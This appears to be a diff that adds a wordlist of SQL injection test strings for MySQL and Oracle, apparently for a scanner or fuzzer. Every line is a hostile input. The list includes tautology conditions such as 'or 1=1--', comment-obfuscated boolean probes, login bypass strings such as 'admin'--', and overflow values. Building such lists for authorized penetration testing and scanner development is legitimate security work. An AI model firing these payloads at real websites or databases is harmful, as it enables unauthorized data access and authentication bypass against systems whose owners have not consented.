@@ -1,0 +1,42 @@
+'
+--ora_sqls
+#mysql
+'#mysql
+ and 1=1
+ and USER=USER
+ and user()=user()
+ and 2=0
+ or 2=2
+' and '2'='2
+' and '2'='0
+' or '2'='2
+/*ora_mysql*/and/**/2=2
+/*ora_mysql*/and/**/2=0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/or/**/'2'='2
+ and 2=2#mysql
+ and 2=0#mysql
+ and 2=2-- oracle_mysql
+ and 2=0-- oracle_mysql
+' and '2'='2'#mysql
+' and '2'='0'#mysql
+' and '2'='2'-- oracle
+' and '2'='0'-- oracle
+999999999999999999
+1e100
+2 or 2=2
+2' or '2'='2
+order by 1--
+admin'--
+admin'
+'test
+'test--
+' or 1=1--
+or 1=1--
+or 1=1
+or 1=1#
+" or 1=1#
+admin'#
+now()
+
